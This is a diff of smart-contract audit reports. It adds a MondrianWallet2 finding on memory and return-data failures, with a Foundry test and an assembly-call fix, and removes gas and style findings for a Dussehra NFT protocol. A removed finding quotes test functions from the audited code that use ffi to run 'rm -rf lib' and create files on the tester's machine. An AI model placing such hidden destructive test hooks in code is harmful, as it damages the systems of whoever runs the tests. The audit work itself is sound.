+**Impact:** Some calls that ought to return a fail (due to excessive build up of memory) will pass the initial `success` check, and only fail afterwards through an `evm error`. Or, inversely, because `_executeTransaction` allows functions to return data and have it stored in memory, some functions fail that ought to succeed. 
+
+The above especially applies to transactions that call a function that returns large amount of bytes. 
+
+Additionally, 
+-  `_executeTransaction` is _very_ gas inefficient due to this issue.
+-  As the execution fails with a `evm error` instead of a correct `MondrianWallet2__ExecutionFailed` error message, functionality of frontend apps might be impacted.  
+
+**Proof of Concept:**
+1. A contract has been deployed that returns a large amount of data. 
+2. `MondrianWallet2` calls this contract. 
+3. The contract fails with an `evm error` instead of `MondrianWallet2__ExecutionFailed`. 
+
+After mitigating this issue (see the Recommended Mitigation section below) 
+4. No call fail with an `evm error` anymore.  
 
 <details>
 <summary> Proof of Concept</summary>
 
-Place the following in `Dussehra.t.sol`. 
+Place the following code after the existing tests in `ModrianWallet2Test.t.sol`: 
+```javascript 
+  contract TargetContract {
+      uint256 public arrayStorage;  
+
+      constructor() {}
+      
+      function writeToArrayStorage(uint256 _value) external returns (uint256[] memory value) {
+          arrayStorage = _value;
+
+          uint256[] memory arr = new uint256[](_value);  
+          
+          return arr;
+      }
+  }
+```
+
+Place the following code in between the existing tests in `ModrianWallet2Test.t.sol`: 
 ```javascript
-      function test_roundingErrorLeavesFundsInContract() public {
-        // we start by setting up a dussehra contract with a fee that has value behind the comma. 
-        uint256 entreeFee = 1 ether + 1; 
-        vm.startPrank(organiser);
-        Dussehra dussehraRoundingError = new Dussehra(entreeFee, address(choosingRam), address(ramNFT));
-        vm.stopPrank();
+      // You'll also need --system-mode=true to run this test
+    function testMemoryAndReturnData() public onlyZkSync {
+        TargetContract targetContract = new TargetContract(); 
+        vm.deal(address(mondrianWallet), 100); 
+        address dest = address(targetContract);
+        uint256 value = 0;
+        uint256 inputValue; 
 
-        vm.startPrank(player1);
-        vm.deal(player1, entreeFee);
-        dussehraRoundingError.enterPeopleWhoLikeRam{value: entreeFee}();
-        vm.stopPrank();
-        
-        vm.startPrank(player2);
-        vm.deal(player2, entreeFee);
-        dussehraRoundingError.enterPeopleWhoLikeRam{value: entreeFee}();
-        vm.stopPrank();
+        // transaction 1
+        inputValue = 310_000;
+        bytes memory functionData1 = abi.encodeWithSelector(TargetContract.writeToArrayStorage.selector, inputValue, AMOUNT);
+        Transaction memory transaction1 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData1);
+        transaction1 = _signTransaction(transaction1);
 
-        vm.startPrank(player3);
-        vm.deal(player3, entreeFee);
-        dussehraRoundingError.enterPeopleWhoLikeRam{value: entreeFee}();
-        vm.stopPrank();
+        // transaction 2 
+        inputValue = 475_000;
+        bytes memory functionData2 = abi.encodeWithSelector(TargetContract.writeToArrayStorage.selector, inputValue, AMOUNT);
+        Transaction memory transaction2 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData2);
+        transaction2 = _signTransaction(transaction2);
 
-        // the organiser first has to select Ram.. 
-        vm.warp(1728691200 + 1);
-        vm.startPrank(organiser);
-        choosingRam.selectRamIfNotSelected(); 
-        vm.stopPrank();
+        vm.startPrank(ANVIL_DEFAULT_ACCOUNT);
+        // the first transaction fails because of an EVM error. 
+        // this transaction will pass with the mitigations implemented (see above). 
+        vm.expectRevert(); 
+        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction1);
 
-        // we call the killRavana function
-        vm.warp(1728691069 + 1);
-        vm.startPrank(player4);
-        dussehraRoundingError.killRavana();
-        vm.stopPrank();
+        // the second transaction fails because of an ExecutionFailed error. 
+        // this transaction will also not pass with the mitigations implemented (see above). 
+        vm.expectRevert(); 
+        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction2);
 
-        // and we call the withdraw function 
-        address selectedRam = choosingRam.selectedRam(); 
-        vm.startPrank(selectedRam);
-        dussehraRoundingError.withdraw();
         vm.stopPrank(); 
-
-        // there are funds left in the contract, meanwhile `totalAmountGivenToRam` has been reset to 0. 
-        // the discrepancy means that the difference will never be retrievable. 
-        assert(address(dussehraRoundingError).balance != 0); 
-        assert(dussehraRoundingError.totalAmountGivenToRam() == 0);
     }
-
 ```
 </details>
 
-**Recommended Mitigation:** The simplest mitigation is to always set the entree fee to a even number, such as 1 ether. 
-
-### [L-2] All functions in the three contracts `ChoosingRam`, `Dussehra` and `RamNFT` of the protocol lack NatSpecs. Without NatSpecs it is difficult for auditors and coders alike to understand, increasing the chance of inadvertently missing vulnerabilities or introducing them. 
- 
- NatSpecs are solidity's descriptions of functions, including their intended functionality, input and output variables. It allows anyone engaging with the code to understand its intended functionality. With this added understanding the chance to accidentally introduce vulnerabilities when refactoring code is reduced. Also, it increases the chance of vulnerabilities being spotted by auditors. 
-
-**Recommended Mitigation:** Add NatSpecs to functions. For more information on solidity's NatSpecs, see the [solidity documentation](https://docs.soliditylang.org/en/latest/natspec-format.html).  
-
-### [L-3] Modifiers that are used only once can be integrated in the function. 
-
-**Description:** 
-
-- Found in src/ChoosingRam.sol 
-
-	```javascript
-	    modifier OnlyOrganiser() {
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	    modifier OnlyRam() {
-	```
-
-	```javascript
-	    modifier RavanKilled() {
-	```
-
-- Found in src/RamNFT.sol 
-
-	```javascript
-	    modifier onlyOrganiser() {
-	```
-
-	```javascript
-	    modifier onlyChoosingRamContract() {
-	```
-
-**Recommended Mitigation:** Integrate modifiers into the functions they modify. 
-
-### [L-4]: Missing checks for `address(0)` when assigning values to address state variables
-
-Check for `address(0)` when assigning values to address state variables.
-
-- Found in src/ChoosingRam.sol 
-
-	```javascript
-	        ramNFT = RamNFT(_ramNFT);
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	        ramNFT = RamNFT(_ramNFT);
-	```
-
-	```javascript
-	        choosingRamContract = ChoosingRam(_choosingRamContract);
-	```
-
-- Found in src/RamNFT.sol 
-
-	```javascript
-	        choosingRamContract = _choosingRamContract;
-	```
-
-**Recommended Mitigation:** Add a zero checks. These differ per case but follow the structure: 
-```diff 
-+ if(<ADDR> != address(0)) {
-+    revert <CONTRACT_NAME>__ZeroCheckFailed();
-+  }
-
-Where <ADDR> is the address state variable and where  <CONTRACT_NAME> is the contract name. 
-
-```
-
-### [L-5] State variables are set to 0 or false when initialised, setting them explicitly to these values at initialisation is a waste of gas.
-
-**Description:** 
-
-- Found in src/ChoosingRam.sol
-
-	```javascript
-	   isRamSelected = false; 
-	```
-
-- Found in src/RamNFT.sol
-
-	```javascript
-	   tokenCounter = 0;
-	```
-
-  ```javascript
-	   Characteristics[newTokenId] = CharacteristicsOfRam({
-            ...
-            isJitaKrodhah: false, 
-            isDhyutimaan: false, 
-            isVidvaan: false,
-            isAatmavan: false, 
-            isSatyavaakyah: false 
-        });
-	```
-
-**Recommended Mitigation:** Remove these lines. 
-
-### [L-6] Any `require` statement can be rewritten to an `if` statement with a function return. This saves gas.
-
-**Description:** 
-
-- Found in src/ChoosingRam.sol 
-
-	```javascript
-	    require(!isRamSelected, "Ram is selected!");
-	```
-
-  ```javascript
-	    require(ramNFT.organiser() == msg.sender, "Only organiser can call this function!"); 
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	    require(choosingRamContract.isRamSelected(), "Ram is not selected yet!");
-	```
-
-	```javascript
-	    require(choosingRamContract.selectedRam() == msg.sender, "Only Ram can call this function!");
-	```
-
-	```javascript
-	    require(IsRavanKilled, "Ravan is not killed yet!");
-	```
-
-	```javascript
-	   require(success, "Failed to send money to organiser");
-	```
-
-  ```javascript
-	   require(success, "Failed to send money to Ram");
-	```
-
-**Recommended Mitigation:** Change `require` statement to an `if` statement. With the first example: 
+**Recommended Mitigation:** By disallowing functions to write return data to memory, this problem can be avoided. In short, replace the standard `.call` with an (assembly) call that restricts the return data to length 0.  
 
 ```diff 
-- require(!isRamSelected, "Ram is selected!");;
-+ if (!isRamSelected) { ChoosingRam_RamIsAlreadySelected(); }
-``` 
-
-Change all require statements following the same logic. 
-
-### [L-7] Any time a function changes a state variable, an event should be emitted. Many of these events are missing throughout the protocol. 
-
-**Description:** 
-
-- Found in src/ChoosingRam.sol 
-
-	```javascript
-	    isRamSelected = true;
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	    ramNFT = RamNFT(_ramNFT);
-	```
-
-	```javascript
-	    choosingRamContract = ChoosingRam(_choosingRamContract);
-	```
-
-	```javascript
-	    IsRavanKilled = true;
-	```
-
-	```javascript
-	   totalAmountGivenToRam = 0;
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	    organiser = msg.sender;
-	```
-
-	```javascript
-	    choosingRamContract = _choosingRamContract;
-	```
-
-	```javascript
-	    _safeMint(to, newTokenId); 
-	```
-
-	```javascript
-	   Characteristics[tokenId] = CharacteristicsOfRam({
-            ram: Characteristics[tokenId].ram,
-            isJitaKrodhah: _isJitaKrodhah,
-            isDhyutimaan: _isDhyutimaan,
-            isVidvaan: _isVidvaan,
-            isAatmavan: _isAatmavan,
-            isSatyavaakyah: _isSatyavaakyah
-        });
-	```
-
-**Recommended Mitigation:** Add the missing events. 
-
-### [L-8] Avoid use of magic numbers: Define and use `constant` variables instead of using literals. 
-
-**Description:** Using `constant` variables instead of literals increases readability of code and decreases chances of inadvertently introducing errors. 
-
-- Found in src/ChoosingRam.sol 
-    ```javascript
-	    if (block.timestamp > 1728691200) {
-            revert ChoosingRam__TimeToBeLikeRamFinish();
-        }
-	```
-
-	```javascript
-	    if (block.timestamp < 1728691200) {
-            revert ChoosingRam__TimeToBeLikeRamIsNotFinish();
-        }
-	```
-
-	```javascript
-	    if (block.timestamp > 1728777600) {
-            revert ChoosingRam__EventIsFinished();
-        }
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	    if (block.timestamp < 1728691069) {
-            revert Dussehra__MahuratIsNotStart();
-        }
-	```
-
-	```javascript
-	    if (block.timestamp > 1728777669) {
-            revert Dussehra__MahuratIsFinished();
-        }
-	```
-
-    ```javascript
-	    totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
-	```    
-
-**Recommended Mitigation:** Change these literal values to constants. With the first example: 
-```diff
-+	uint256 public constant DEADLINE_ENTREE_TO_BE_LIKE_RAM = 1728691200; 
-    
--    if (block.timestamp > 1728691200) {
-+    if (block.timestamp > DEADLINE_ENTREE_TO_BE_LIKE_RAM) {
-        revert ChoosingRam__TimeToBeLikeRamFinish();
-    }
+-   (success,) = to.call{value: value}(data);
++    assembly {
+        success := call(gas(), to, value, add(data, 0x20), mload(data), 0, 0)
+     }
 ```
 
-Apply the same logic to the other literal values. 
+## Low 
+### Including `MondrianWallet2::constructor` is unnecessary and can be left out to save gas. 
 
-### [L-9] The `ChoosingRam::increaseValuesOfParticipants` uses a very convoluted, gas inefficient approach to upgrading characteristics of ramNFTs. 
+**Description:** In normal EVM code, an upgradable contract needs to disable initialisers to avoid them writing data to storage. In ZkSync, because of the different way contracts are deployed, there is no difference between deployed code and constructor code. In more detail, from [the ZKSync documentation](https://docs.zksync.io/build/developer-reference/era-contracts/system-contracts): 
+>
+> On Ethereum, the constructor is only part of the initCode that gets executed during the deployment of the contract and returns the deployment code of the contract. 
+> On ZKsync, there is no separation between deployed code and constructor code. The constructor is always a part of the deployment code of the contract. 
+> In order to protect it from being called, the compiler-generated contracts invoke constructor only if the isConstructor flag provided (it is only available for the system contracts).
+>
 
-**Description:** The `ChoosingRam::increaseValuesOfParticipants` uses a very convoluted, gas inefficient approach to upgrading characteristics of ramNFTs. 
-```javascript
-  if (random == 0) {
-            if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false){
-                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, false, false, false, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false){
-                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, false, false, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false){
-                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, false, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false){
-                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
-                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
-                selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
-            }
-        } else {
-            if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false){
-                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, false, false, false, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false){
-                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, false, false, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false){
-                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, false, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false){
-                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, false);
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
-                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
-                selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
-            }
-        }
-```
+**Impact:** Disabling initializers in the constructor is unnecessary. 
 
-**Recommended Mitigation:** As the characteristics are ordinal (they add up) it is much more efficient to use an enum in its stead. As this is a low risk finding, I will suffice with leaving a link to solidity-by-example on enums: https://solidity-by-example.org/enum/. 
-
-### [L-10] The `RamNFT` is a ERC721 token, but does not use any functionality of an ERC token.
-
-**Description:** The `RamNFT` is a ERC721 token, but does not use any functionality of an ERC token. Notably: 
-1. The NFT is not linked to a uri: as such, it is not linked to an off-chain image or asset.   
-2. It is possible to transfer a token to another person, without any impact on the functionality of the protocol. The address that will receive a payout is the address that initially minted the selectedRam, not the address that owns the selected ramNFT. 
-3. In general, transferring, trading, burning or any other functionality that comes with an ERC721 token has no impact on the functionality of the broader protocol.
-
-**Impact:** It does not impact the overall functionality of the protocol, but the unnecessary inclusion of ERC721 does waste gas.    
-
-**Recommended Mitigation:** Either integrate ERC721 functionality into the protocol or remove the ERC721 imports.  
-
-### [L-11] Any state variable that is only set at construction time and not changed afterwards, should be set to immutable.  
-
-**Description:** 
-
-- Found in src/ChoosingRam.sol 
-    ```javascript
-	   RamNFT public ramNFT;
-	```
-
-- Found in src/Dussehra.sol 
-
-	```javascript
-	   uint256 public entranceFee; 
-	```
-
-	```javascript
-	    address public organiser; 
-	```
-
-- Found in src/RamNFT.sol 
-
-	```javascript
-	   address public organiser;
-	```
-
-**Recommended Mitigation:** Change these state variables to immutable. 
-
-### [L-12] Literal boolean comparisons are unnecessary.     
-
-**Description:** 
-
-- Found in src/ChoosingRam.sol 
-    ```javascript
-	   if (random == 0) {
-            if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false){
-      
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false){
-    
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false){
-   
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false){
-
-            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
-
-            if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false){
-    
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false){
-
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false){
-
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false){
-     
-            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
-    
-	```
-
-- Found in src/Dussehra.sol 
-
-    ```javascript
-        if (peopleLikeRam[msg.sender] == true){
-    ```
-
-**Recommended Mitigation:** Remove `== true` and replace `== false` with `!`.  
-```diff
--        if (peopleLikeRam[msg.sender] == true){
-+        if (peopleLikeRam[msg.sender]){  
-```
+**Recommended Mitigation:** Remove the following code: 
 
 ```diff
--        if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false)
-+        if (!ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah)
+-    constructor() {
+-        _disableInitializers();
+-    }
 ```
 
-### [L-13] The function `Dussehra::enterPeopleWhoLikeRam` tracks the number addresses of participants by pushing them into an array. This is costs a lot of gas, it is better to use a counter instead.       
-
-**Description:** The function `Dussehra::enterPeopleWhoLikeRam` tracks the number addresses of participants by pushing them into an array. This is costs a lot of gas. It is better to use a counter instead.  
-
-**Recommended Mitigation:** Change `WantToBeLikeRam` from an `address[]` to a `uint256` and use it as a counter. 
-```diff
--   address[] public WantToBeLikeRam;
-+   uint256 public WantToBeLikeRam;
- .
- .
- .
-    peopleLikeRam[msg.sender] = true;
--   WantToBeLikeRam.push(msg.sender);
-+   WantToBeLikeRam++;
-    ramNFT.mintRamNFT(msg.sender);
-.
-.
-.
--   uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
-+   uint256 totalAmountByThePeople = WantToBeLikeRam * entranceFee;
-```
-
-### [L-14] It is a waste of gas to add additional getter functions for public state variables, because they are given getter functions automatically.  
-
-**Description:**
-
-- Found in src/RamNFT.sol 
-    ```javascript
-        function getCharacteristics(uint256 tokenId) public view returns (CharacteristicsOfRam memory) {
-            return Characteristics[tokenId];
-        }
-    ```
-    `Characteristics` is a public state variable. 
-
-    ```javascript
-        function getNextTokenId() public view returns (uint256) {
-            return tokenCounter;
-        }
-    ```
-    `tokenCounter` is a public state variable. 
-
-**Recommended Mitigation:** Remove these getter functions. 
-
-### [L-15] Remove unused state variables. 
-
-**Description:** 
-- Found in src/Dussehra.sol 
-```javascript
-    address public SelectedRam; 
-
-```
-**Recommended Mitigation:** Remove the unused state variable.  
-
-
-### [L-16] The testing suite does not include any fuzz tests, coverage of unit tests can be improved, and naming of tests is often confusing. This might have resulted in some bugs not being spotted.
-
-**Description** Although technically not in scope, it should be noted that fuzz tests are missing and unit test coverage is incomplete. This might have resulted in some bugs not being spotted.
-
-Also, having unit tests suddenly write straight to my file system was interesting... but also a bit scary. This should obviously never been done in real life. (And I will from now on always do ctrl-f 'ffi' before running a test script in foundry and check the mock files!). 
-
-```javascript
-    import { mock } from "../src/mocks/mock.sol";
-```
-
-```javascript
-    function test_EverythingWorksFine() public {
-        string[] memory cmds = new string[](3);
-        cmds[0] = "rm"; 
-        cmds[1] = "-rf";
-        cmds[2] = "lib";
-        
-        cheatCodes.ffi(cmds);
-    }
-```
-
-```javascript
-    function test_EverythingWorksFine1() public {
-        string[] memory cmds = new string[](2);
-        cmds[0] = "touch";
-        cmds[1] = "1. You have been";
-        
-        cheatCodes.ffi(cmds);
-    }
-```
-
-...and so on. 
+## False Positives 
